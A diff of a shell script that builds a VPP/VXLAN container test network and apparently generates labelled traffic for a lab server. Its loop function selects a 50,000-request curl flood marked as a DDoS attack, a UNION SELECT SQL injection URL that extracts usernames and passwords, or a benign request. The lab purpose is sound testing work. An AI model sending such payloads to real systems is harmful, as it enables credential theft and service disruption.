@@ -18,7 +18,7 @@
 # Globals.
 ################################################################################
 # VPP instance socket.
-export VPP_SOCK=/run/vpp/client_ddos.sock
+export VPP_SOCK=/run/vpp/client.sock
 # Alias for vppctl that uses the correct socket name.
 export VPPCTL="vppctl -s ${VPP_SOCK}"
 # Our "Docker bridge network". Don't change this value.
@@ -50,12 +50,12 @@ function context_create()
         type vxlan \
         id "${VXLAN_ID_LINUX}" \
         dstport "${VXLAN_PORT}" \
-        local "${CLIENT_DDOS_BRIDGE_IP_DOCKER}" \
+        local "${CLIENT_BRIDGE_IP_DOCKER}" \
         group "${MC_VXLAN_ADDR_LINUX}" \
         dev "${NET_IF_DOCKER}" \
         ttl 1
     ip link set "${LINK_VXLAN_LINUX}" up
-    ip addr add "${CLIENT_DDOS_VXLAN_IP_LINUX}/${MASK_VXLAN_LINUX}" dev "${LINK_VXLAN_LINUX}"
+    ip addr add "${CLIENT_VXLAN_IP_LINUX}/${MASK_VXLAN_LINUX}" dev "${LINK_VXLAN_LINUX}"
 
     # Get MTU of interface. VXLAN must use a smaller value due to overhead.
     mtu="$(cat /sys/class/net/${NET_IF_DOCKER}/mtu)"
@@ -80,13 +80,13 @@ function context_create()
     ${VPPCTL} create interface memif id 0 slave
     sleep 1
     ${VPPCTL} set int state memif0/0 up
-    ${VPPCTL} set int ip address memif0/0 "${CLIENT_DDOS_VPP_TAP_IP_MEMIF}/${VPP_MEMIF_NM}"
+    ${VPPCTL} set int ip address memif0/0 "${CLIENT_VPP_TAP_IP_MEMIF}/${VPP_MEMIF_NM}"
 
     # Create VPP-controlled tap interface bridged to the memif.
     ${VPPCTL} create tap id 0 host-if-name vpp-tap-0
     sleep 1
     ${VPPCTL} set interface state tap0 up
-    ip addr add "${CLIENT_DDOS_VPP_TAP_IP_MEMIF}/${VPP_TAP_NM}" dev vpp-tap-0
+    ip addr add "${CLIENT_VPP_TAP_IP_MEMIF}/${VPP_TAP_NM}" dev vpp-tap-0
     ${VPPCTL} set interface l2 bridge tap0          "${VPP_BRIDGE_DOMAIN_TAP}"
     ${VPPCTL} set interface l2 bridge memif0/0      "${VPP_BRIDGE_DOMAIN_TAP}"
     sleep 10
@@ -104,15 +104,20 @@ function context_destroy()
 # @brief:   Client worker loop to keep the container alive. Just idles.
 function context_loop()
 {
-    # Sleep indefinitely (to keep container alive for testing).
-    # tail -f /dev/null
-    # iperf -c ${SERVER_DDOS_VPP_TAP_IP_MEMIF} -t 20
-    for i in {1..50000}
-    do
-        response=$(curl "http://${SERVER_DDOS_VXLAN_IP_LINUX}/?arg=ddos")
-        echo $response
-    done
-    #response=$(curl "http://${SERVER_DDOS_VXLAN_IP_LINUX}/?id=-1\"%20union%20select%20username,username,password,password,username%20FROM%20users%20where%20id=1%20--%20")
+    if [ $CLIENT_OPTION -eq "1" ] # DDOS attack
+    then
+        for i in {1..50000}
+        do
+            response=$(curl "http://${SERVER_DDOS_VXLAN_IP_LINUX}/?arg=ddos")
+            echo $response
+        done
+    elif [ $CLIENT_OPTION -eq "2" ] # SQL injection attack 
+    then
+        response=$(curl "http://${SERVER_DDOS_VXLAN_IP_LINUX}/?id=-1\"%20union%20select%20username,username,password,password,username%20FROM%20users%20where%20id=1%20--%20")
+    elif [ $CLIENT_OPTION -eq "3" ] # no attack
+    then
+        response=$(curl "http://${SERVER_DDOS_VXLAN_IP_LINUX}/?id=1")
+    fi
     tail -f /dev/null
 }
 
